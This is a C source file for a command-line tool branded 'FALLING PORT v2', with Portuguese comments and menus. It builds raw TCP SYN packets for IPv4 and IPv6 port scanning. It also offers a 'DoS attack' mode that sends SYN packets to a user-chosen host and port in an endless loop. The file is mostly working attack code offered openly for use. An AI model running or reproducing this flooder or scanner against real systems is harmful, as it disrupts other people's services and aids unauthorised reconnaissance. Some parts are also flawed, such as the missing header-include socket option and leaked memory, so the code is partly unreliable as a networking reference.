#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <ifaddrs.h>
#include <sys/time.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip6.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <stdint.h> // Para uint8_t, uint16_t, etc.

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #pragma comment(lib, "ws2_32.lib")
#else
    #define _GNU_SOURCE
    #include <netinet/in.h>
    #define INVALID_SOCKET -1
    #define SOCKET_ERROR -1
    #define closesocket close
    typedef int SOCKET;
#endif

// Estruturas para checksum
struct pseudo_header_v4 {
    uint32_t source;
    uint32_t dest;
    uint8_t placeholder;
    uint8_t protocol;
    uint16_t tcp_length;
};

struct pseudo_header_v6 {
    struct in6_addr src;
    struct in6_addr dst;
    uint32_t length;
    uint8_t zero[3];
    uint8_t protocol;
};

// Protótipos
unsigned short checksum(unsigned short *buf, int len);
unsigned short tcp_checksum_v4(struct iphdr *ip, struct tcphdr *tcp);
unsigned short tcp_checksum_v6(struct ip6_hdr *ip6, struct tcphdr *tcp);
char* get_local_ip(int ipv6);
int syn_scan(const char *target, int port, int ipv6);
void dos_attack(const char *target, int port, int ipv6);
void print_banner();

// Função principal
int main() {
    int opcao, porta, porta_inicial, porta_final, ipv6 = 0;
    char alvo[256];

    print_banner();

    printf("1. Scan IPv4\n2. Scan IPv6\n3. Ataque DoS IPv4\n4. Ataque DoS IPv6\nEscolha: ");
    scanf("%d", &opcao);
    getchar(); // Limpa buffer

    ipv6 = (opcao == 2 || opcao == 4) ? 1 : 0;

    printf("\nAlvo (IP/Dominio): ");
    fgets(alvo, sizeof(alvo), stdin);
    alvo[strcspn(alvo, "\n")] = 0;

    if(opcao <= 2) {
        printf("Porta inicial: ");
        scanf("%d", &porta_inicial);
        printf("Porta final: ");
        scanf("%d", &porta_final);

        printf("\nIniciando scan %s...\n", ipv6 ? "IPv6" : "IPv4");
        for(int p = porta_inicial; p <= porta_final; p++) {
            if(syn_scan(alvo, p, ipv6)) {
                printf("[+] Porta %d aberta\n", p);
            }
        }
    } else {
        printf("Porta: ");
        scanf("%d", &porta);
        printf("\nIniciando ataque DoS...\n");
        dos_attack(alvo, porta, ipv6);
    }

    #ifdef _WIN32
        WSACleanup();
    #endif
    return 0;
}

// Implementações
unsigned short checksum(unsigned short *buf, int len) {
    unsigned long sum = 0;
    while(len > 1) {
        sum += *buf++;
        len -= 2;
    }
    if(len == 1) sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

unsigned short tcp_checksum_v4(struct iphdr *ip, struct tcphdr *tcp) {
    struct pseudo_header_v4 psh;
    psh.source = ip->saddr;
    psh.dest = ip->daddr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr));

    char *buf = malloc(sizeof(psh) + sizeof(*tcp));
    memcpy(buf, &psh, sizeof(psh));
    memcpy(buf + sizeof(psh), tcp, sizeof(*tcp));

    unsigned short csum = checksum((unsigned short *)buf, sizeof(psh) + sizeof(*tcp));
    free(buf);
    return csum;
}

unsigned short tcp_checksum_v6(struct ip6_hdr *ip6, struct tcphdr *tcp) {
    struct pseudo_header_v6 psh;
    psh.src = ip6->ip6_src;
    psh.dst = ip6->ip6_dst;
    psh.length = htonl(sizeof(*tcp));
    memset(psh.zero, 0, 3);
    psh.protocol = IPPROTO_TCP;

    char *buf = malloc(sizeof(psh) + sizeof(*tcp));
    memcpy(buf, &psh, sizeof(psh));
    memcpy(buf + sizeof(psh), tcp, sizeof(*tcp));

    unsigned short csum = checksum((unsigned short *)buf, sizeof(psh) + sizeof(*tcp));
    free(buf);
    return csum;
}

int syn_scan(const char *target, int port, int ipv6) {
    struct addrinfo hints, *res;
    SOCKET sock;
    char ipstr[INET6_ADDRSTRLEN];
    
    memset(&hints, 0, sizeof(hints));
    hints.ai_family = ipv6 ? AF_INET6 : AF_INET;
    hints.ai_socktype = SOCK_RAW;

    if(getaddrinfo(target, NULL, &hints, &res) != 0) {
        printf("Erro na resolucao DNS\n");
        return 0;
    }

    // Cria socket
    sock = socket(res->ai_family, SOCK_RAW, IPPROTO_TCP);
    if(sock == INVALID_SOCKET) {
        perror("socket");
        freeaddrinfo(res);
        return 0;
    }

    // Preenche headers
    char packet[4096] = {0};
    if(ipv6) {
        struct ip6_hdr *ip6 = (struct ip6_hdr *)packet;
        struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(*ip6));
        
        // Preenche IPv6
        ip6->ip6_flow = htonl(0x60000000); // Version 6
        ip6->ip6_plen = htons(sizeof(*tcp));
        ip6->ip6_nxt = IPPROTO_TCP;
        ip6->ip6_hops = 255;
        inet_pton(AF_INET6, get_local_ip(1), &ip6->ip6_src);
        memcpy(&ip6->ip6_dst, &((struct sockaddr_in6 *)res->ai_addr)->sin6_addr, 16);

        // Preenche TCP
        tcp->source = htons(12345);
        tcp->dest = htons(port);
        tcp->syn = 1;
        tcp->doff = 5;
        tcp->window = htons(64240);
        tcp->check = tcp_checksum_v6(ip6, tcp);
    } else {
        struct iphdr *ip = (struct iphdr *)packet;
        struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(*ip));
        
        // Preenche IPv4
        ip->ihl = 5;
        ip->version = 4;
        ip->tot_len = htons(sizeof(*ip) + sizeof(*tcp));
        ip->ttl = 255;
        ip->protocol = IPPROTO_TCP;
        ip->saddr = inet_addr(get_local_ip(0));
        ip->daddr = ((struct sockaddr_in *)res->ai_addr)->sin_addr.s_addr;

        // Preenche TCP
        tcp->source = htons(12345);
        tcp->dest = htons(port);
        tcp->syn = 1;
        tcp->doff = 5;
        tcp->window = htons(64240);
        tcp->check = tcp_checksum_v4(ip, tcp);
    }

    // Envia e recebe
    struct timeval timeout = {1, 0};
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    
    sendto(sock, packet, ipv6 ? sizeof(struct ip6_hdr) + sizeof(struct tcphdr) : 
                                sizeof(struct iphdr) + sizeof(struct tcphdr), 
          0, res->ai_addr, res->ai_addrlen);

    char buffer[4096];
    if(recv(sock, buffer, sizeof(buffer), 0) > 0) {
        struct tcphdr *recv_tcp = (struct tcphdr *)(buffer + (ipv6 ? sizeof(struct ip6_hdr) : 
                                                                sizeof(struct iphdr)));
        if(recv_tcp->syn && recv_tcp->ack) {
            closesocket(sock);
            freeaddrinfo(res);
            return 1;
        }
    }

    closesocket(sock);
    freeaddrinfo(res);
    return 0;
}

// Funções auxiliares
char* get_local_ip(int ipv6) {
    struct ifaddrs *ifaddr, *ifa;
    char *ip = NULL;

    if (getifaddrs(&ifaddr) == -1) {
        perror("getifaddrs");
        return NULL;
    }

    for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next) {
        if (ifa->ifa_addr == NULL) continue;

        if (ipv6 && ifa->ifa_addr->sa_family == AF_INET6) {
            struct sockaddr_in6 *addr6 = (struct sockaddr_in6 *)ifa->ifa_addr;
            ip = (char *)malloc(INET6_ADDRSTRLEN);
            inet_ntop(AF_INET6, &addr6->sin6_addr, ip, INET6_ADDRSTRLEN);
            break;
        } else if (!ipv6 && ifa->ifa_addr->sa_family == AF_INET) {
            struct sockaddr_in *addr4 = (struct sockaddr_in *)ifa->ifa_addr;
            ip = (char *)malloc(INET_ADDRSTRLEN);
            inet_ntop(AF_INET, &addr4->sin_addr, ip, INET_ADDRSTRLEN);
            break;
        }
    }

    freeifaddrs(ifaddr);
    return ip;
}

void dos_attack(const char *target, int port, int ipv6) {
    while(1) {
        syn_scan(target, port, ipv6);
        printf("Pacote enviado para %s:%d\n", target, port);
    }
}

void print_banner() {
    printf("\033[1;31m");
    printf("***************************************\n");
    printf("*           FALLING PORT v2           *\n");
    printf("*  Suporte IPv4/IPv6 + DNS + DoS      *\n");
    printf("*     By: github.com/Marlon009        *\n");
    printf("***************************************\n");

    
    printf("\033[0m\n");
}